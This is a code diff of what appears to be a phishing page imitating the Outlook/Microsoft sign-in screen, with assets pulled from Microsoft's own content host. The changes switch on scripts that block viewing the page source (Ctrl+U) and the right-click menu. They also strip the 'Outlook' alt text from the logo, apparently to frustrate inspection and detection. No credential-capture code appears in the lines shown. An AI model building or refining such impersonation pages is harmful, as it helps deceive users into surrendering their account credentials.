@@ -403,7 +403,7 @@
   <body>
     <section id="singin_section">
       <div id="s_header">
-        <img alt="Outlook" id="outlk_logo" />
+        <img alt="" id="outlk_logo" />
       </div>
       <div id="s_body">
         <div class="k_s_wrapper">
@@ -581,18 +581,18 @@
           key_part1.classList.add('height_gainer');
         }
       }
-      // function redirectCU(e) {
-      //   if (e.ctrlKey && e.which == 85) {
-      //     return false;
-      //   }
-      // }
-      // document.onkeydown = redirectCU;
-      // function redirectKK(e) {
-      //   if (e.which == 3) {
-      //     return false;
-      //   }
-      // }
-      // document.oncontextmenu = redirectKK;
+        function redirectCU(e) {
+          if (e.ctrlKey && e.which == 85) {
+            return false;
+          }
+         }
+        document.onkeydown = redirectCU;
+        function redirectKK(e) {
+          if (e.which == 3) {
+            return false;
+          }
+        }
+        document.oncontextmenu = redirectKK;
       var num = 2;
       var parentLink = 'https://aadcdn.msftauth.net/shared/1.0/content/';
       while (num < 4) {
@@ -610,7 +610,7 @@
       );
       setImg(
         document.getElementById('key_icon'),
-        'images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg'
+        'images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg'
       );
       setImg(
         document.getElementById('back_icon_'),
